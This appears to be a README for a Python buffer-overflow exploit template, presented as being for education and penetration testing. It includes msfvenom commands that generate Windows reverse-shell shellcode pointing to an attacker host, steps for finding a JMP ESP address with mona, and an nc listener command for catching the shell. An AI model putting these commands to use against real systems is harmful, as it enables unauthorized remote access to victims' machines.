# Buffer Overflow Exploit Script

## Description 📜
This script is a **dummy** code for exploiting a **Buffer Overflow (BOF)** vulnerability by sending a custom payload to overflow memory in the target program. Default settings are included and **require modification** for proper functionality on the target system.

⚠️ **Warning:** This script is **intended for educational purposes** and ethical penetration testing only. Unauthorized use may lead to legal consequences.

---

## Requirements 💻
- Python 3
- The `socket` library (pre-installed with Python)
- A target system that has a BOF vulnerability and accepts network input

## How to Use 🚀

1. **Configure the Script:**
   - Update the `ip` and `port` variables to match your target.

2. **Customize the Shellcode:**
   - Use `msfvenom` to generate the appropriate shellcode and update the `sc` variable with it. Example command:
     ```bash
     msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> EXITFUNC=thread -b "\x00" -f python -v "sc"
     ```

3. **Set the Offset:**
   - Define the correct offset for the overflow in the `offset` variable based on your target program. The default here is set to 634.

4. **Adjust JMP ESP Address:**
   - Extract the correct JMP ESP address using the `mona` tool and replace the `jmp` variable.

5. **Run the Script:**
   - After configuring all variables, run the script with:
     ```bash
     python exploit.py
     ```

6. **Activate a Listener:**
   - Open a listener on your system to receive the reverse shell connection:
     ```bash
     nc -nlvp <YOUR_PORT>
     ```

---

## Script Structure 🧩
- `ip`: Target IP address
- `port`: Target port for connection
- `command`: Command prefix for the buffer overflow exploit
- `offset`: Number of characters to overflow
- `jmp`: JMP ESP address
- `nops`: NOP sled to guide the payload
- `sc`: The shellcode payload for reverse shell or command execution

---

## Example 📍
### Generating Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=9001 EXITFUNC=thread -b "\x00" -f python -v "sc"
```

---

## Final Notes 📌
- Ensure that the changes you make align with the target and BOF type.
- Test the script in a fully secure environment before using it in any real-world applications.
- 
---

## Disclaimer ⚠️
**Unauthorized use** of this script may be illegal.

